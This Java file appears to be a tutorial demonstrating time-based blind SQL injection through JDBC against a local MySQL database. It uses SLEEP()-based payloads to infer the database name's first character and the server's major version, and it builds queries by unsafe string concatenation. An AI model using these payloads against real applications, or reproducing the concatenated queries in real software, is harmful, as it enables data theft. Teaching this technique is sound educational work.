// Time-Based Blind SQL Injection via JDBC
// Attacker infers data by measuring how long the query takes to respond.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class time_based_blind_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: SLEEP() delays response only when the condition is true
        String payload = "1 AND IF(SUBSTRING(database(),1,1)='m', SLEEP(3), 0)";
        String query = "SELECT id FROM users WHERE id = " + payload;

        long start = System.currentTimeMillis();
        ResultSet rs = st.executeQuery(query);
        long elapsed = System.currentTimeMillis() - start;

        System.out.println("Query took " + elapsed + " ms");
        System.out.println(elapsed > 2000
                ? "Database name starts with 'm' (delayed response)"
                : "Condition was false (fast response)");

        // Version probe using sleep
        String ver = "1 AND IF(SUBSTRING(version(),1,1)='8', SLEEP(2), 0)";
        long vStart = System.currentTimeMillis();
        st.executeQuery("SELECT id FROM users WHERE id = " + ver);
        long vElapsed = System.currentTimeMillis() - vStart;
        System.out.println(vElapsed > 1500 ? "MySQL major version is 8" : "Version probe false");

        rs.close();
        st.close();
        con.close();
    }
}
